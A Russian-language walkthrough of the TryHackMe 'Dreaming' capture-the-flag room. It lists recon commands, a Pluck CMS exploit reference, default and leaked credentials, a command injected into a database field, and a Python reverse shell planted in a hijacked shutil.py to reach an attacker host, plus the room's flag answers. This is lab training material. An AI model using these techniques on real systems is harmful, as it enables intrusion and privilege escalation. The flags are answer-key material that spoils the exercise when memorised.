[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Dreaming](https://tryhackme.com/r/room/dreaming) 

Всего 1 заданиe:
## Задание 1
Пока король снов находился в заключении, его дом превратился в руины.

Сможете ли вы помочь Песочному человеку восстановить его королевство?

### Ответьте на вопросы ниже
Что такое флаг Люсьена?
```commandline
nmap -sC -sV <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
# https://www.exploit-db.com/exploits/49909
# http://<IP>/app/pluck-4.7.13/login.php
admin:password
# death, lucien, morpheus
nc -lvnp 1234
cd /opt
ls
password = "HeyLucien#@1999!"
ssh lucien@<IP>
cat lucient_flug.txt
```
```commandline
THM{TH3_L1BR4R14N}
```
Что такое Флаг Смерти?
```commandline
cat .bash_history
mysql -u lucien -plucien42DBPASSWORD
show databases;
show tables;
select * from dreams;
UPDATE dreams SET dream = '; /bin/bash -p' WHERE dreamer = 'Alice';
select * from dreams;
exit
sudo -l
sudo -u death /usr/bin/python3 /home/death/getDreams.py
id
chmod 777 /home/death/getDreams.py
cat getDreams.py
# death:!momentoMORI666!
su death
cat death_flag.txt
```
```commandline
THM{1M_TH3R3_4_TH3M}
```
Что такое Флаг Морфеуса?
```commandline
cat /home/morpheus/restore.py
find / -name shutil.py 2>/dev/null
ls -lai /usr/lib/python3.8/shutil.py

vim /usr/lib/python3.8/shutil.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker IP>",<attacker port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

nc -lnvp 1234
sudo -l
sudo su
```
```commandline
THM{DR34MS_5H4P3_TH3_W0RLD}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)